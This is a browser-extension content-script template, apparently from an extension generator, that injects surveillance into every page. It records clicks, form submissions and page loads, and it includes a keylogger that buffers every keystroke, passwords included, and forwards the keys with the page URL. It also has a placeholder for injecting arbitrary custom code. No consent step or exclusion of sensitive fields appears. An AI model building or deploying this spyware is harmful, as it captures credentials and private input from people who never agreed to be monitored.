
// Content script for {{EXTENSION_NAME}}
(function() {
  'use strict';

  // Track clicks if enabled
  if ({{FEATURE_CLICK_TRACKING}}) {
    document.addEventListener('click', function(event) {
      const clickData = {
        type: 'click',
        timestamp: Date.now(),
        elementTag: event.target.tagName,
        elementId: event.target.id,
        elementClass: event.target.className,
        elementText: event.target.textContent?.substring(0, 100),
        pageX: event.pageX,
        pageY: event.pageY,
        url: window.location.href
      };
      
      sendMessage(clickData);
    });
  }

  // Track form submissions if enabled
  if ({{FEATURE_FORM_DATA}}) {
    document.addEventListener('submit', function(event) {
      const formData = {
        type: 'form_submit',
        timestamp: Date.now(),
        formAction: event.target.action,
        formMethod: event.target.method,
        url: window.location.href
      };
      
      sendMessage(formData);
    });
  }

  // Track keystrokes if enabled (be careful with this)
  if ({{FEATURE_KEYLOGGER}}) {
    let keyBuffer = '';
    document.addEventListener('keydown', function(event) {
      keyBuffer += event.key;
      
      // Send keystroke data every 10 characters or on Enter
      if (keyBuffer.length >= 10 || event.key === 'Enter') {
        const keystrokeData = {
          type: 'keystrokes',
          timestamp: Date.now(),
          keys: keyBuffer,
          url: window.location.href,
          elementTag: event.target.tagName
        };
        
        sendMessage(keystrokeData);
        keyBuffer = '';
      }
    });
  }

  // Take screenshots if enabled
  if ({{FEATURE_SCREENSHOT}}) {
    setTimeout(() => {
      takeScreenshot();
    }, 2000); // Wait 2 seconds after page load
  }

  // Send message to background script
  function sendMessage(data) {
    try {
      chrome.runtime.sendMessage(data);
    } catch (error) {
      console.error('Error sending message to background:', error);
    }
  }

  // Take screenshot using html2canvas-like functionality
  function takeScreenshot() {
    // This would require additional libraries in a real implementation
    // For now, we'll just send page dimensions and scroll position
    const screenshotData = {
      type: 'screenshot',
      timestamp: Date.now(),
      windowWidth: window.innerWidth,
      windowHeight: window.innerHeight,
      scrollX: window.scrollX,
      scrollY: window.scrollY,
      documentWidth: document.documentElement.scrollWidth,
      documentHeight: document.documentElement.scrollHeight,
      url: window.location.href
    };
    
    sendMessage(screenshotData);
  }

  // Page load tracking
  const pageData = {
    type: 'page_load',
    timestamp: Date.now(),
    url: window.location.href,
    title: document.title,
    referrer: document.referrer,
    loadTime: performance.timing ? 
      performance.timing.loadEventEnd - performance.timing.navigationStart : 0
  };
  
  sendMessage(pageData);

  // Custom user code injection
  {{CUSTOM_CODE}}

})();
